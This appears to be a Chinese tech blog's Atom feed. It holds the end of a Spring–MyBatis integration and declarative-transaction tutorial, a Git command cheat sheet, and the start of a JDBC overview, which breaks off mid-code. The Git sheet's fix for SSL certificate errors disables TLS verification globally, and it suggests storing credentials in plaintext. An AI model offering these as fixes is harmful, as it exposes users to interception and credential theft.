class_">UserDaoImpl</span> <span class="keyword">implements</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">   <span class="comment">//sqlSession不用我们自己创建了，Spring来管理</span></span><br><span class="line">   <span class="keyword">private</span> SqlSessionTemplate sqlSession;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSqlSession</span><span class="params">(SqlSessionTemplate sqlSession)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>.sqlSession = sqlSession;</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">selectUser</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">       <span class="keyword">return</span> mapper.selectUser();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>将自己写的实现类，注入到Spring中</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.dao.UserDaoImpl&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sqlSession&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;sqlSession&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>测试使用即可</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> (UserMapper) context.getBean(<span class="string">&quot;userDao&quot;</span>);</span><br><span class="line">    List&lt;User&gt; user = mapper.selectUser();</span><br><span class="line">    System.out.println(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><p>结果成功输出！现在我们的Mybatis配置文件的状态！发现都可以被Spring整合！</p><p>为了<font color=red>给mybatis-config.xml留点面子</font>(使用方便)，在其中将别名和设置留下来</p>   <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">          <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">          <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;nuc.ss.pojo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!-- &lt;settings&gt;</span></span><br><span class="line"><span class="comment">    &lt;setting&gt;&lt;/setting&gt;</span></span><br><span class="line"><span class="comment">    &lt;/settings&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>**整合实现二  **</p><p>mybatis-spring1.2.3版以上的才有这个 .</p><p>官方文档截图 :</p><p>dao继承Support类 , 直接利用 getSqlSession() 获得 , 然后直接注入SqlSessionFactory . 比起方式1 , 不需要管理SqlSessionTemplate , 而且对事务的支持更加友好 . 可跟踪源码查看</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/12.png"                      alt="1078856-20170205160357354-490660449"                ></p><p>测试：</p><ol><li><p>将我们上面写的UserDaoImpl修改一下</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl</span> <span class="keyword">extends</span> <span class="title class_">SqlSessionDaoSupport</span> <span class="keyword">implements</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">selectUser</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> getSqlSession().getMapper(UserMapper.class);</span><br><span class="line">       <span class="keyword">return</span> mapper.selectUser();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>修改bean的配置</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.dao.UserDaoImpl&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>测试</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">   <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> (UserMapper) context.getBean(<span class="string">&quot;userDao&quot;</span>);</span><br><span class="line">   List&lt;User&gt; user = mapper.selectUser();</span><br><span class="line">   System.out.println(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><p><strong><font color=red>总结 : 整合到spring以后可以完全不要mybatis的配置文件，除了这些方式可以实现整合之外，我们还可以使用注解来实现，这个等我们后面学习SpringBoot的时候还会测试整合！</font></strong></p><h2 id="13、声明式事务"><a href="#13、声明式事务" class="headerlink" title="13、声明式事务"></a>13、声明式事务</h2><h3 id="13-1、回顾事务"><a href="#13-1、回顾事务" class="headerlink" title="13.1、回顾事务"></a>13.1、回顾事务</h3><ul><li>把一组业务当成一个业务来做；要么都成功，要么都失败！</li><li>事务在项目开发中，十分重要，涉及到数据的一致性问题，不能马虎</li><li>确保完整性和一致性</li></ul><p><strong>事务的ACID原则</strong></p><ul><li>原子性（atomicity）<ul><li>事务是原子性操作，由一系列动作组成，事务的原子性确保动作要么全部完成，要么完全不起作用</li></ul></li><li>一致性（consistency）<ul><li>一旦所有事务动作完成，事务就要被提交。数据和资源处于一种满足业务规则的一致性状态中</li></ul></li><li>隔离性（isolation）<ul><li>多个业务可能操作同一个资源，防止数据损坏</li></ul></li><li>持久性（durability）<ul><li>事务一旦提交，无论系统发生什么问题，结果都不会再被影响，被持久化的写到存储器中！</li></ul></li></ul><h3 id="13-2、Spring中的事务管理"><a href="#13-2、Spring中的事务管理" class="headerlink" title="13.2、Spring中的事务管理"></a>13.2、Spring中的事务管理</h3><ul><li><p><strong>声明式事务</strong>：AOP</p><ul><li>一般情况下比编程式事务好用。</li><li>将事务管理代码从业务方法中分离出来，以声明的方式来实现事务管理。</li><li>将事务管理作为横切关注点，通过aop方法模块化。Spring中通过Spring AOP框架支持声明式事务管理</li></ul></li><li><p><strong>编程式事务</strong>：需要在代码中，进行事务的管理</p><ul><li>将事务管理代码嵌到业务方法中来控制事务的提交和回滚</li><li>缺点：必须在每个事务操作业务逻辑中包含额外的事务管理代码</li></ul></li><li><p><strong>使用Spring管理事务，注意头文件的约束导入 : tx</strong></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/tx</span><br><span class="line">http://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt;</span><br></pre></td></tr></table></figure></div></li><li><p><strong>事务管理器</strong></p><ul><li>无论使用Spring的哪种事务管理策略（编程式或者声明式）事务管理器都是必须的。</li><li>就是 Spring的核心事务管理抽象，管理封装了一组独立于技术的方法。</li></ul></li><li><p><strong>JDBC事务</strong></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p><strong>配置事务的通知</strong></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置事务通知--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;transactionManager&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--配置哪些方法使用什么样的事务,配置事务的传播特性--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;delete&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;update&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;search*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;get&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p><strong>spring事务传播特性：</strong></p><p>事务传播行为就是多个事务方法相互调用时，事务如何在这些方法间传播。spring支持7种事务传播行为：</p><ul><li><strong>propagation_requierd</strong>：如果当前没有事务，就新建一个事务，如果已存在一个事务中，加入到这个事务中，这是最常见的选择。</li><li>propagation_supports：支持当前事务，如果没有当前事务，就以非事务方法执行。</li><li>propagation_mandatory：使用当前事务，如果没有当前事务，就抛出异常。</li><li>propagation_required_new：新建事务，如果当前存在事务，把当前事务挂起。</li><li>propagation_not_supported：以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。</li><li>propagation_never：以非事务方式执行操作，如果当前事务存在则抛出异常。</li><li><strong>propagation_nested</strong>：如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则执行与propagation_required类似的操作</li></ul></li><li><p><strong>配置AOP</strong>（导入aop的头文件！）</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置aop织入事务--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;txPointcut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* nuc.ss.dao.*.*(..))&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;txPointcut&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li></ul><p>思考：</p><p>为什么需要事务？</p><ul><li>如果不配置，可能存在数据提交不一致的情况；</li><li>如果我们不在Spring中去配置声明式事务，我们需要在代码中手动配置事务！</li><li>事务在项目开发过程非常重要，涉及到数据的一致性的问题，不容马虎！</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="spring" scheme="http://example.com/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2025/04/26/java/io/io%E6%B5%81/"/>
    <id>http://example.com/2025/04/26/java/io/io%E6%B5%81/</id>
    <published>2025-04-26T11:30:29.883Z</published>
    <updated>2025-04-26T11:30:29.883Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>常用 Git 命令集合</title>
    <link href="http://example.com/2025/04/20/linux/%E5%B8%B8%E7%94%A8%20Git%20%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"/>
    <id>http://example.com/2025/04/20/linux/%E5%B8%B8%E7%94%A8%20Git%20%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/</id>
    <published>2025-04-20T19:31:53.000Z</published>
    <updated>2025-04-26T11:30:29.887Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Git-基础配置"><a href="#Git-基础配置" class="headerlink" title="Git 基础配置"></a>Git 基础配置</h2><h3 id="配置用户信息"><a href="#配置用户信息" class="headerlink" title="配置用户信息"></a>配置用户信息</h3><p>在使用 Git 前，首先需要配置用户信息：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">"Your Name"</span></span><br><span class="line">git config --global user.email <span class="string">"your.email@example.com"</span></span><br></pre></td></tr></table></figure></div><p>查看当前配置信息：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure></div><h3 id="SSH-密钥配置"><a href="#SSH-密钥配置" class="headerlink" title="SSH 密钥配置"></a>SSH 密钥配置</h3><p>为了安全地连接 GitHub，需要配置 SSH 密钥：</p><ol><li><p>生成 SSH 密钥对：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"youremail@example.com"</span></span><br></pre></td></tr></table></figure></div></li><li><p>密钥默认生成在 <code>~/.ssh</code> 目录下：</p><ul><li>公钥文件：<code>id_rsa.pub</code></li><li>私钥文件：<code>id_rsa</code></li></ul></li><li><p>将公钥添加到 GitHub：</p><ul><li>复制 <code>id_rsa.pub</code> 文件内容</li><li>访问 <a class="link" href="https://github.com/settings/keys">https://github.com/settings/keys <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>点击 “New SSH key” 并粘贴公钥内容</li></ul></li></ol><h2 id="仓库基本操作"><a href="#仓库基本操作" class="headerlink" title="仓库基本操作"></a>仓库基本操作</h2><h3 id="创建本地仓库"><a href="#创建本地仓库" class="headerlink" title="创建本地仓库"></a>创建本地仓库</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化 Git 仓库</span></span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加文件到暂存区</span></span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交更改</span></span><br><span class="line">git commit -m <span class="string">'提交说明'</span></span><br></pre></td></tr></table></figure></div><h3 id="远程仓库操作"><a href="#远程仓库操作" class="headerlink" title="远程仓库操作"></a>远程仓库操作</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加远程仓库</span></span><br><span class="line">git remote add origin git@github.com:用户名/仓库名.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送到远程仓库（首次推送需要-u参数）</span></span><br><span class="line">git push -u origin master</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从远程仓库克隆</span></span><br><span class="line">git <span class="built_in">clone</span> &lt;仓库远程地址&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取远程更新</span></span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure></div><h2 id="日常工作命令"><a href="#日常工作命令" class="headerlink" title="日常工作命令"></a>日常工作命令</h2><h3 id="查看状态和差异"><a href="#查看状态和差异" class="headerlink" title="查看状态和差异"></a>查看状态和差异</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看仓库状态</span></span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件差异</span></span><br><span class="line">git diff</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看提交历史</span></span><br><span class="line">git <span class="built_in">log</span>  <span class="comment"># 详细历史</span></span><br><span class="line">git <span class="built_in">log</span> --oneline  <span class="comment"># 简洁版本</span></span><br><span class="line">git <span class="built_in">log</span> --graph  <span class="comment"># 分支合并图</span></span><br></pre></td></tr></table></figure></div><h3 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 回退版本</span></span><br><span class="line">git reset [--soft | --mixed | --hard] HEAD^</span><br><span class="line"></span><br><span class="line"><span class="comment"># 撤销提交</span></span><br><span class="line">git revert &lt;commit-id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂存工作区</span></span><br><span class="line">git stash</span><br><span class="line">git stash list  <span class="comment"># 查看暂存列表</span></span><br><span class="line">git stash pop   <span class="comment"># 恢复并删除暂存</span></span><br></pre></td></tr></table></figure></div><h3 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建并切换分支</span></span><br><span class="line">git checkout -b &lt;branch-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换分支</span></span><br><span class="line">git checkout &lt;branch-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并分支</span></span><br><span class="line">git merge &lt;branch-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除分支</span></span><br><span class="line">git branch -d &lt;branch-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看分支</span></span><br><span class="line">git branch      <span class="comment"># 本地分支</span></span><br><span class="line">git branch -r   <span class="comment"># 远程分支</span></span><br><span class="line">git branch -a   <span class="comment"># 所有分支</span></span><br></pre></td></tr></table></figure></div><h3 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建标签</span></span><br><span class="line">git tag &lt;tagname&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建带说明的标签</span></span><br><span class="line">git tag -a &lt;tagname&gt; -m <span class="string">"tag message"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有标签</span></span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看标签信息</span></span><br><span class="line">git show &lt;tagname&gt;</span><br></pre></td></tr></table></figure></div><h3 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 丢弃工作区的修改</span></span><br><span class="line">git checkout -- &lt;file&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 撤销暂存区的修改</span></span><br><span class="line">git reset HEAD &lt;file&gt;</span><br></pre></td></tr></table></figure></div><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除文件并暂存此次删除</span></span><br><span class="line">git <span class="built_in">rm</span> &lt;file&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从暂存区移除文件，但保留在工作区</span></span><br><span class="line">git <span class="built_in">rm</span> --cached &lt;file&gt;</span><br></pre></td></tr></table></figure></div><h3 id="远程仓库操作扩展"><a href="#远程仓库操作扩展" class="headerlink" title="远程仓库操作扩展"></a>远程仓库操作扩展</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重命名远程仓库</span></span><br><span class="line">git remote rename &lt;old-name&gt; &lt;new-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远程仓库</span></span><br><span class="line">git remote <span class="built_in">rm</span> &lt;repository&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从远程获取代码库</span></span><br><span class="line">git fetch &lt;remote&gt;</span><br></pre></td></tr></table></figure></div><h2 id="高级操作"><a href="#高级操作" class="headerlink" title="高级操作"></a>高级操作</h2><h3 id="变基操作"><a href="#变基操作" class="headerlink" title="变基操作"></a>变基操作</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将当前分支变基到指定分支</span></span><br><span class="line">git rebase &lt;branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互式变基最近三次提交</span></span><br><span class="line">git rebase -i HEAD~3</span><br></pre></td></tr></table></figure></div><h3 id="储存凭证"><a href="#储存凭证" class="headerlink" title="储存凭证"></a>储存凭证</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 永久储存凭证</span></span><br><span class="line">git config --global credential.helper store</span><br></pre></td></tr></table></figure></div><h3 id="清理仓库"><a href="#清理仓库" class="headerlink" title="清理仓库"></a>清理仓库</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除所有未跟踪的文件</span></span><br><span class="line">git clean -f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除所有未跟踪的文件和目录</span></span><br><span class="line">git clean -fd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 压缩和清理仓库</span></span><br><span class="line">git gc</span><br></pre></td></tr></table></figure></div><h2 id="常见问题解决"><a href="#常见问题解决" class="headerlink" title="常见问题解决"></a>常见问题解决</h2><h3 id="SSL证书问题"><a href="#SSL证书问题" class="headerlink" title="SSL证书问题"></a>SSL证书问题</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.sslVerify <span class="literal">false</span></span><br></pre></td></tr></table></figure></div><h3 id="强制推送"><a href="#强制推送" class="headerlink" title="强制推送"></a>强制推送</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git push -f origin &lt;branch&gt;  <span class="comment"># 谨慎使用，会覆盖远程分支</span></span><br></pre></td></tr></table></figure></div><h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><ol><li>提交之前先pull</li><li>经常commit，适时push</li><li>分支开发，主干发布</li><li>添加有意义的提交信息</li><li>及时处理冲突</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
    <category term="git" scheme="http://example.com/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>JDBC技术详解</title>
    <link href="http://example.com/2025/04/16/java/jdbc/jdbc/"/>
    <id>http://example.com/2025/04/16/java/jdbc/jdbc/</id>
    <published>2025-04-16T21:30:00.000Z</published>
    <updated>2025-04-26T11:30:29.883Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="JDBC技术详解"><a href="#JDBC技术详解" class="headerlink" title="JDBC技术详解"></a>JDBC技术详解</h1><h2 id="1-JDBC基本概念"><a href="#1-JDBC基本概念" class="headerlink" title="1. JDBC基本概念"></a>1. JDBC基本概念</h2><p>JDBC (Java Database Connectivity) 是Java语言与数据库交互的标准API，它允许Java程序连接到各种关系型数据库。下面是对JDBC核心内容的总结：</p><p>JDBC是一套标准接口，提供了一种与数据库无关的访问方式，主要包括：</p><ul><li><strong>JDBC API</strong>：Java程序员使用的接口和类</li><li><strong>JDBC驱动程序管理器</strong>：负责管理不同数据库的驱动程序</li><li><strong>JDBC驱动程序</strong>：特定数据库厂商提供的实现类</li></ul><h2 id="2-JDBC核心组件"><a href="#2-JDBC核心组件" class="headerlink" title="2. JDBC核心组件"></a>2. JDBC核心组件</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 核心接口和类</span></span><br><span class="line">java.sql.DriverManager  <span class="comment">// 管理JDBC驱动程序</span></span><br><span class="line">java.sql.Connection     <span class="comment">// 与数据库的连接</span></span><br><span class="line">java.sql.Statement      <span class="comment">// 执行SQL语句</span></span><br><span class="line">java.sql.PreparedStatement  <span class="comment">// 预编译SQL语句</span></span><br><span class="line">java.sql.CallableStatement  <span class="comment">// 调用存储过程</span></span><br><span class="line">java.sql.ResultSet      <span class="comment">// 查询结果集</span></span><br></pre></td></tr></table></figure></div><h2 id="3-JDBC工作流程"><a href="#3-JDBC工作流程" class="headerlink" title="3. JDBC工作流程"></a>3. JDBC工作流程</h2><h3 id="3-1-基本使用步骤"><a href="#3-1-基本使用步骤" class="headerlink" title="3.1 基本使用步骤"></a>3.1 基本使用步骤</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 加载驱动</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 建立连接</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>, <span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 创建Statement对象</span></span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"><span class="comment">// 